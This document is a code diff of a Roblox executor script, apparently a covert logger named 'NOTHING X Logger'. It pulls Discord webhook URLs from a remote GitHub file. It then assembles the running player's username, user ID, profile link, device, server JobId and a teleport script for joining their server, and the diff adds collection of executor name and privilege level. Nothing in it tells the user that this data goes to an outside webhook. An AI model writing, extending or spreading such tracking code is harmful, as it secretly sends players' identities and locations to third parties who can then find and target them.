@@ -3,14 +3,12 @@ local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local requestFunc = syn and syn.request or http_request or request or (fluxus and fluxus.request)
-
 local RawURL = "https://raw.githubusercontent.com/OverlordCryx/NOTHING-X-X-X-NAHH/refs/heads/X/XVX"
 local Webhooks = {}
 
 local success, response = pcall(function()
     return requestFunc({Url = RawURL, Method = "GET"})
 end)
-
 if success and response and response.Body then
     for webhook in string.gmatch(response.Body, "[^\r\n]+") do
         webhook = webhook:gsub("%s+", "")
@@ -25,7 +23,6 @@ local function VerifyWebhook(webhook)
         return requestFunc({Url = webhook, Method = "GET"})
     end)
     if not s or not r or not r.Body then return false end
-
     local ds, data = pcall(function()
         return HttpService:JSONDecode(r.Body)
     end)
@@ -41,15 +38,13 @@ for _, wh in ipairs(Webhooks) do
         break
     end
 end
-
-if not WebhookURL then
-    return
-end
+if not WebhookURL then return end
 
 local player = Players.LocalPlayer
 local placeId = game.PlaceId
-local matchType = "Unknown"
+local jobId = game.JobId
 
+local matchType = "Unknown"
 if placeId == 10449761463 then
     matchType = "Normal"
 elseif placeId == 12360882630 then
@@ -60,7 +55,6 @@ end
 
 local platform = UserInputService:GetPlatform()
 local device = "Unknown"
-
 if platform == Enum.Platform.Windows or platform == Enum.Platform.OSX or platform == Enum.Platform.Linux or platform == Enum.Platform.UWP then
     device = "PC"
 elseif platform == Enum.Platform.IOS or platform == Enum.Platform.Android then
@@ -75,8 +69,38 @@ if successInfo and info and info.Name then
     gameName = info.Name
 end
 
-local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
-local joinLink = "https://www.roblox.com/games/" .. placeId .. "?gameInstanceId=" .. game.JobId
+local function getExecutorInfo()
+    local execName = "Unknown"
+    local execLevel = "Unknown"
+
+    if identifyexecutor then
+        execName = identifyexecutor()
+    elseif getexecutorname then
+        execName = getexecutorname()
+    elseif syn and syn.get_name then
+        execName = syn.get_name()
+    elseif fluxus and fluxus.get_name then
+        execName = fluxus.get_name()
+    elseif krnl and krnl.get_name then
+        execName = krnl.get_name()
+    end
+
+    if getgenv and getgenv().executor_level then
+        execLevel = tostring(getgenv().executor_level)
+    elseif getthreadidentity and type(getthreadidentity) == "function" then
+        execLevel = tostring(getthreadidentity())
+    elseif getidentity and type(getidentity) == "function" then
+        execLevel = tostring(getidentity())
+    elseif syn and syn.get_thread_identity then
+        execLevel = tostring(syn.get_thread_identity())
+    end
+
+    return execName, execLevel
+end
+
+local execName, execLevel = getExecutorInfo()
+
+
 
 local data = {
     username = "NOTHING_X",
@@ -88,12 +112,14 @@ local data = {
             {name = "User ID", value = tostring(player.UserId), inline = true},
             {name = "Game Name", value = gameName, inline = true},
             {name = "Place ID", value = tostring(placeId), inline = true},
-            {name = "Server ID (JobId)", value = tostring(game.JobId), inline = true},
-            {name = "TSB Type", value = matchType, inline = true},
+            {name = "Server ID", value = tostring(jobId), inline = true},
+            {name = "Type", value = matchType, inline = true},
             {name = "Device", value = device, inline = true},
-            {name = "He Play", value = "[SERVER](" .. joinLink .. ")", inline = false},
-            {name = "Profile", value = "[VIEW PROFILE](" .. profileLink .. ")", inline = false},
-            {name = "Join Script", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. game.JobId .. "\")\n```\nJoin using Place ID + Server ID (JobId)", inline = false}
+            {name = "Executor Name", value = execName, inline = true},
+            {name = "Executor Level", value = execLevel, inline = true},
+         {name = "Server", value = "[Server](https://www.roblox.com/games/" .. placeId .. "?gameInstanceId=" .. jobId .. ")", inline = false},
+            {name = "Profile", value = "[VIEW PROFILE](https://www.roblox.com/users/" .. player.UserId .. "/profile)", inline = false},
+            {name = "Join Script", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. game.JobId .. "\")\n```\n", inline = false}
         },
         footer = {text = "NOTHING X Logger"},
         timestamp = DateTime.now():ToIsoDate()
